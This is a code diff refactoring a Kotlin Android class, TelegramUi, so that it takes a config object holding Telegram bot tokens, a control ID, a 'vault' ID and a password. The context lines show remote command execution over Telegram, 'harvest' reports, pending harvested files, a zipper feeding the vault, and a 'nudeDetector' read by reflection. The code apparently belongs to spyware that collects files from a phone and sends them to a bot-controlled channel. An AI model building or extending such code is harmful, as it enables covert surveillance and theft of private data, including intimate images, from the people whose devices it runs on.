@@ -18,7 +18,7 @@ import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.TimeUnit
 import kotlin.random.Random
 
-// ✅ استيراد دوال safeGet من MapExtensions.kt
+// استيراد دوال safeGet من MapExtensions.kt
 import com.example.app.safeGet
 
 /**
@@ -27,11 +27,7 @@ import com.example.app.safeGet
 class TelegramUi(
     context: Context,
     private val monitor: Any?,
-    activeTokens: List<String>,
-    reserveTokens: List<String>,
-    private val ctrlId: String,
-    private val vaultId: String,
-    private val appPassword: String
+    private val config: AppConfig          // ✅ استلام كائن الإعدادات الكامل
 ) {
 
     private val contextRef = WeakReference(context.applicationContext)
@@ -52,8 +48,14 @@ class TelegramUi(
     private var heartbeatJob: Job? = null
 
     // ========== بيانات البوتات والأجهزة ==========
-    private val activeTokensList = Collections.synchronizedList(activeTokens.filter { it.isNotBlank() }.toMutableList())
-    private val reserveTokensList = Collections.synchronizedList(reserveTokens.filter { it.isNotBlank() }.toMutableList())
+    // ✅ استخدام التوكنات من config
+    private val activeTokensList = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
+    private val reserveTokensList = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
+
+    // ✅ المعرفات وكلمة المرور من config
+    private val ctrlId: String = config.controlId.toString()
+    private val vaultId: String = config.vaultId.toString()
+    private val appPassword: String = config.secret ?: ""
 
     private val sessions = ConcurrentHashMap<String, Long>()
     private val devices = ConcurrentHashMap<String, JSONObject>()
@@ -96,16 +98,14 @@ class TelegramUi(
         private const val TAG = "TelegramUi"
         private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
 
+        // ✅ تحديث دالة المصنع لتأخذ config
+        @JvmStatic
         fun create(
             context: Context,
             monitor: Any?,
-            activeTokens: List<String>,
-            reserveTokens: List<String>,
-            ctrlId: String,
-            vaultId: String,
-            appPassword: String
+            config: AppConfig
         ): TelegramUi {
-            return TelegramUi(context, monitor, activeTokens, reserveTokens, ctrlId, vaultId, appPassword)
+            return TelegramUi(context, monitor, config)
         }
     }
 
@@ -189,7 +189,6 @@ class TelegramUi(
 
     private fun getNextToken(): String? {
         synchronized(activeTokensList) {
-            // ✅ التحقق من أن القائمة ليست فارغة قبل استخدام Random.nextInt
             if (activeTokensList.isEmpty()) return null
             return activeTokensList[Random.nextInt(activeTokensList.size)]
         }
@@ -623,7 +622,6 @@ class TelegramUi(
             )
         } catch (e: Exception) {
             writeLog("Harvest details error: ${e.message}")
-            // إرسال تقرير خطأ
             sendErrorReport(
                 "فشل عرض تفاصيل الحصاد",
                 mapOf(
@@ -701,7 +699,6 @@ class TelegramUi(
                     }
                     "/status" -> {
                         val status = getStatus()
-                        // ✅ استخدام safeGet بدلاً من الأقواس المربعة
                         val activeTokens = status.safeGet("active_tokens") ?: 0
                         val reserveTokens = status.safeGet("reserve_tokens") ?: 0
                         val devicesCount = status.safeGet("devices") ?: 0
@@ -739,7 +736,6 @@ class TelegramUi(
                 Commands.ex(appContext ?: return, text, this, monitor, chatId)
             } catch (e: Exception) {
                 writeLog("Command error: ${e.message}")
-                // إرسال تقرير خطأ
                 sendErrorReport(
                     "خطأ في تنفيذ الأمر",
                     mapOf(
@@ -915,8 +911,6 @@ class TelegramUi(
                     return
                 }
                 data == "ai_status" -> {
-                    // ✅ التحقق الآمن من حالة نموذج AI مع try-catch
-                    // وتقديم قيمة افتراضية آمنة في حالة حدوث أي استثناء
                     val status = if (monitor != null) {
                         try {
                             val detector = monitor.javaClass.getDeclaredField("nudeDetector")
@@ -1120,6 +1114,25 @@ class TelegramUi(
             "pending_files" to countPendingHarvest()
         )
     }
+
+    // ============================================================
+    //  ✅ دوال إضافية مطلوبة للانعكاس (Reflection)
+    // ============================================================
+
+    /**
+     * إرجاع معرف الخزنة (Vault ID) المستخدم في DailyZipper و Commands.
+     */
+    fun getVlt(): Long = config.vaultId
+
+    /**
+     * إرجاع معرف التحكم (Control ID) إذا لزم الأمر.
+     */
+    fun getCtrl(): Long = config.controlId
+
+    /**
+     * إرجاع معرف الدردشة الافتراضي (للتوافق مع الكود القديم).
+     */
+    fun getDat(): Long = config.vaultId
 
     // ============================================================
     //  دوال مساعدة (التسجيل والكتابة)
